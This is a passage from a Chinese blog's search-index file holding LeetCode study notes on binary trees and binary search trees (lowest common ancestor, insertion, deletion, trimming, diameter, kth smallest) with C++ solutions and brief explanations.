class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">postorder</span>(root);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="236-二叉树的最近公共祖先"><a href="#236-二叉树的最近公共祖先" class="headerlink" title="236 二叉树的最近公共祖先"></a>236 二叉树的最近公共祖先</h2></li>
</ul>
<p><strong>二叉树，只能通过后序遍历（即：回溯）实现从底向上的遍历方式。</strong><br><img src="https://img-blog.csdnimg.cn/1ded8f4b90704392bd7eccf255cdf375.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span> || root==q || root==p)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        TreeNode *left = <span class="built_in">lowestCommonAncestor</span>(root-&gt;left,p,q);</span><br><span class="line">        TreeNode *right = <span class="built_in">lowestCommonAncestor</span>(root-&gt;right,p,q);</span><br><span class="line">        <span class="keyword">if</span>(left &amp;&amp; right)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(left &amp;&amp; !right)</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!left &amp;&amp; right)</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="235-二叉搜索树的最近公共祖先"><a href="#235-二叉搜索树的最近公共祖先" class="headerlink" title="235 二叉搜索树的最近公共祖先"></a>235 二叉搜索树的最近公共祖先</h2><p>给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。<br>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”<br><strong>分析：</strong><br>该题当然也可以用上面二叉树的最近公共祖先求解<br>但对于二叉搜索树，应该利用其有序的特征，即 如果 中间节点是 q 和 p 的公共祖先，那么 中节点的数组 一定是在 [p, q]区间的。即 中节点 &gt; p &amp;&amp; 中节点 &lt; q 或者 中节点 &gt; q &amp;&amp; 中节点 &lt; p。</p>
<ul>
<li>只要从上到下去遍历，遇到 cur节点是数值在[p, q]区间中则一定可以说明该节点cur就是q 和 p的公共祖先。 那问题来了，一定是最近公共祖先吗？<ul>
<li>是的</li>
</ul>
</li>
<li><strong>所以当我们从上向下去递归遍历，第一次遇到 cur节点是数值在[p, q]区间中，那么cur就是 p和q的最近公共祖先</strong><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val &gt; p-&gt;val &amp;&amp; root-&gt;val &gt; q-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">lowestCommonAncestor</span>(root-&gt;left,p,q);</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val &lt; p-&gt;val &amp;&amp; root-&gt;val &lt; q-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">lowestCommonAncestor</span>(root-&gt;right,p,q);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(root)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;val &gt; p-&gt;val &amp;&amp; root-&gt;val &gt; q-&gt;val)</span><br><span class="line">                root = root-&gt;left;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;val &lt; p-&gt;val &amp;&amp; root-&gt;val &lt; q-&gt;val)</span><br><span class="line">                root = root-&gt;right;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="701-二叉搜索树中的插入操作——插入一个结点"><a href="#701-二叉搜索树中的插入操作——插入一个结点" class="headerlink" title="701 二叉搜索树中的插入操作——插入一个结点"></a>701 二叉搜索树中的插入操作——插入一个结点</h3>注意，可能<strong>存在多种有效的插入方式</strong>，只要树在插入后仍保持为二叉搜索树即可。 你可以返回任意有效的结果。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">insert</span><span class="params">(TreeNode* root, <span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            TreeNode *node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(val);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(val &gt; root-&gt;val)&#123;</span><br><span class="line">            <span class="comment">//if(root-&gt;right)</span></span><br><span class="line">                root-&gt;right = <span class="built_in">insert</span>(root-&gt;right,val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(val &lt; root-&gt;val)&#123;</span><br><span class="line">            <span class="comment">//if(root-&gt;left)</span></span><br><span class="line">                root-&gt;left = <span class="built_in">insert</span>(root-&gt;left,val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">insertIntoBST</span><span class="params">(TreeNode* root, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">insert</span>(root,val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*=</span></span><br><span class="line"><span class="comment">    迭代</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">insertIntoBST</span><span class="params">(TreeNode* root, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            TreeNode *node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(val);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode *cur = root;</span><br><span class="line">        TreeNode *parent = root;</span><br><span class="line">        <span class="keyword">while</span>(cur)&#123;<span class="comment">//while寻找 插入位置</span></span><br><span class="line">            parent = cur;</span><br><span class="line">            <span class="keyword">if</span>(val &gt; cur-&gt;val)</span><br><span class="line">                cur = cur-&gt;right;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(val &lt; cur-&gt;val)</span><br><span class="line">                cur = cur-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode *node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(val);<span class="comment">//新建结点</span></span><br><span class="line">        <span class="keyword">if</span>(val &gt; parent-&gt;val)</span><br><span class="line">            parent-&gt;right = node;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            parent-&gt;left = node;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="450-删除二叉搜索树中的节点"><a href="#450-删除二叉搜索树中的节点" class="headerlink" title="450 删除二叉搜索树中的节点"></a>450 删除二叉搜索树中的节点</h2>给定一个二叉搜索树的根节点 root 和一个值 key，删除二叉搜索树中的 key 对应的节点，并保证二叉搜索树的性质不变。返回二叉搜索树（有可能被更新）的根节点的引用。</li>
</ul>
<p>一般来说，删除节点可分为两个步骤：</p>
<pre><code>首先找到需要删除的节点；
如果找到了，删除它。
</code></pre>
<p><strong>删除结点【五种情况】：</strong>被删结点的情况</p>
<ul>
<li>是叶子结点：直接删除即可</li>
<li>有左结点，无右结点：让其左节点替代自己</li>
<li>有右结点，无左结点：让其右节点替代自己</li>
<li>既有左结点，又有右结点：</li>
</ul>
<p><strong>法一：分五种情况</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">deleteNode</span><span class="params">(TreeNode* root, <span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> root; <span class="comment">// 第一种情况：没找到删除的节点，遍历到空节点直接返回了</span></span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val == key) &#123;</span><br><span class="line">            <span class="comment">// 第二种情况：左右孩子都为空（叶子节点），直接删除节点， 返回NULL为根节点</span></span><br><span class="line">            <span class="keyword">if</span> (root-&gt;left == <span class="literal">nullptr</span> &amp;&amp; root-&gt;right == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="comment">///! 内存释放</span></span><br><span class="line">                <span class="keyword">delete</span> root;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 第三种情况：其左孩子为空，右孩子不为空，删除节点，右孩子补位 ，返回右孩子为根节点</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;left == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="keyword">auto</span> retNode = root-&gt;right;</span><br><span class="line">                <span class="comment">///! 内存释放</span></span><br><span class="line">                <span class="keyword">delete</span> root;</span><br><span class="line">                <span class="keyword">return</span> retNode;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 第四种情况：其右孩子为空，左孩子不为空，删除节点，左孩子补位，返回左孩子为根节点</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;right == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="keyword">auto</span> retNode = root-&gt;left;</span><br><span class="line">                <span class="comment">///! 内存释放</span></span><br><span class="line">                <span class="keyword">delete</span> root;</span><br><span class="line">                <span class="keyword">return</span> retNode;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 第五种情况：左右孩子节点都不为空，则将删除节点的左子树放到删除节点的右子树的最左面节点的左孩子的位置</span></span><br><span class="line">            <span class="comment">// 并返回删除节点右孩子为新的根节点。</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                TreeNode* cur = root-&gt;right; <span class="comment">// 找右子树最左面的节点</span></span><br><span class="line">                <span class="keyword">while</span>(cur-&gt;left != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                    cur = cur-&gt;left;</span><br><span class="line">                &#125;</span><br><span class="line">                cur-&gt;left = root-&gt;left; <span class="comment">// 把要删除的节点（root）左子树放在cur的左孩子的位置</span></span><br><span class="line">                TreeNode* tmp = root;   <span class="comment">// 把root节点保存一下，下面来删除</span></span><br><span class="line">                root = root-&gt;right;     <span class="comment">// 返回旧root的右孩子作为新root</span></span><br><span class="line">                <span class="keyword">delete</span> tmp;             <span class="comment">// 释放节点内存（这里不写也可以，但C++最好手动释放一下吧）</span></span><br><span class="line">                <span class="keyword">return</span> root;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &gt; key) root-&gt;left = <span class="built_in">deleteNode</span>(root-&gt;left, key);</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &lt; key) root-&gt;right = <span class="built_in">deleteNode</span>(root-&gt;right, key);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>法二：普通二叉树的删除方式</strong><br>（没有使用搜索树的特性，遍历整棵树），用交换值的操作来删除目标节点。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">deleteNode</span><span class="params">(TreeNode* root, <span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> root;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val == key) &#123;</span><br><span class="line">            <span class="keyword">if</span> (root-&gt;right == <span class="literal">nullptr</span>) &#123; <span class="comment">// 这里第二次操作目标值：最终删除的作用</span></span><br><span class="line">                <span class="keyword">return</span> root-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">            TreeNode *cur = root-&gt;right;</span><br><span class="line">            <span class="keyword">while</span> (cur-&gt;left) &#123;</span><br><span class="line">                cur = cur-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">swap</span>(root-&gt;val, cur-&gt;val); <span class="comment">// 这里第一次操作目标值：交换目标值其右子树最左面节点。</span></span><br><span class="line">        &#125;</span><br><span class="line">        root-&gt;left = <span class="built_in">deleteNode</span>(root-&gt;left, key);</span><br><span class="line">        root-&gt;right = <span class="built_in">deleteNode</span>(root-&gt;right, key);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="669-修剪二叉搜索树"><a href="#669-修剪二叉搜索树" class="headerlink" title="669 修剪二叉搜索树"></a>669 修剪二叉搜索树</h2><p>给定一个二叉搜索树，同时给定最小边界L 和最大边界 R。通过修剪二叉搜索树，使得所有节点的值在[L, R]中 (R&gt;=L) 。你可能需要改变树的根节点，所以结果应当返回修剪好的二叉搜索树的新的根节点。【本题存在唯一答案】</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">trimBST</span><span class="params">(TreeNode* root, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span> ) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &lt; low) &#123;</span><br><span class="line">            TreeNode* right = <span class="built_in">trimBST</span>(root-&gt;right, low, high); <span class="comment">// 寻找符合区间[low, high]的节点</span></span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &gt; high) &#123;</span><br><span class="line">            TreeNode* left = <span class="built_in">trimBST</span>(root-&gt;left, low, high); <span class="comment">// 寻找符合区间[low, high]的节点</span></span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125;</span><br><span class="line">        root-&gt;left = <span class="built_in">trimBST</span>(root-&gt;left, low, high); <span class="comment">// root-&gt;left接入符合条件的左孩子</span></span><br><span class="line">        root-&gt;right = <span class="built_in">trimBST</span>(root-&gt;right, low, high); <span class="comment">// root-&gt;right接入符合条件的右孩子</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="543-二叉树的直径"><a href="#543-二叉树的直径" class="headerlink" title="543 二叉树的直径"></a>543 二叉树的直径</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    求最大深度 进阶版</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;<span class="comment">//全局遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">depth</span><span class="params">(TreeNode* root)</span></span>&#123;<span class="comment">//某棵树的最大深度</span></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> left_max = <span class="built_in">depth</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">int</span> right_max = <span class="built_in">depth</span>(root-&gt;right);</span><br><span class="line">        res = <span class="built_in">max</span>(res,left_max + right_max);<span class="comment">//重点</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(left_max , right_max)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">diameterOfBinaryTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> root_max = <span class="built_in">depth</span>(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="230-二叉搜索树中第K小的元素"><a href="#230-二叉搜索树中第K小的元素" class="headerlink" title="230 二叉搜索树中第K小的元素"></a>230 二叉搜索树中第K小的元素</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  中序遍历</span></span><br><span class="line"><span class="comment">    第k小 [k-1]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(TreeNode *root,vector&lt;<span class="keyword">int</span>&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">inorder</span>(root-&gt;left,res);</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);<span class="comment">//装入序列</span></span><br><span class="line">        <span class="built_in">inorder</span>(root-&gt;right,res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">kthSmallest</span><span class="params">(TreeNode* root, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">inorder</span>(root,res);</span><br><span class="line">        <span class="comment">//sort(res.begin(),res.end());</span></span><br><span class="line">        <span class="keyword">return</span> res[k<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>力扣刷题</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>力扣</tag>
      </tags>
  </entry>
</search>
